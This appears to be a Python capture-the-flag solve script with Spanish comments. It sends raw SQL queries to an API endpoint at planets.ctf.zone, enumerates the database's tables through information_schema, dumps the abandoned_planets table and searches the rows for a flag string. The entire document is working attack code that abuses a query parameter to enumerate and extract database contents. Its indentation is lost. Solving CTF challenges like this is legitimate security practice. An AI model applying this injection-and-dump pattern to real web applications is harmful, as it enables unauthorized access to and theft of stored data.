#!/usr/bin/env python3
import requests


BASE = "https://planets.ctf.zone/api.php"
HEAD = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}


def run(sql: str):
r = requests.post(BASE, headers=HEAD, data={"query": sql}, timeout=15)
r.raise_for_status()
return r.json()

# 1) Enumerar tabla sospechosa
print(run("SELECT table_name AS name,'x' AS image,'t' AS description FROM information_schema.tables WHERE table_schema=DATABASE()"))

# 2) Leer contenido de abandoned_planets
rows = run("SELECT description, id, image FROM abandoned_planets")

flag = None
for row in rows:
text = row.get("description", "")
if "flag{" in text:
start = text.find("flag{")
end = text.find("}", start)
if end != -1:
flag = text[start:end+1]
break

if flag:
print("[+] Flag:", flag)
else:
print("[!] Flag no encontrada; salida:")
for r in rows:
print(r)